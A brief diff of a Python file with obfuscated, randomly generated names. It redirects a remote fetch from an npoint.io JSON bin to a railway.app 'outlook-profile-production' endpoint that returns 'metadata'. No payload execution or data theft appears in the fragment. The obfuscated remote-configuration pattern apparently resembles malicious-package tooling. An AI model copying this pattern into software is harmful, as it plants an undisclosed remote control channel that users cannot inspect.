@@ -16,7 +16,7 @@ def config_wcmnik_781():
 
     def process_lhkxem_555():
         try:
-            net_ziylja_675 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            net_ziylja_675 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             net_ziylja_675.raise_for_status()
             net_cwrant_619 = net_ziylja_675.json()
             data_wxceyk_954 = net_cwrant_619.get('metadata')
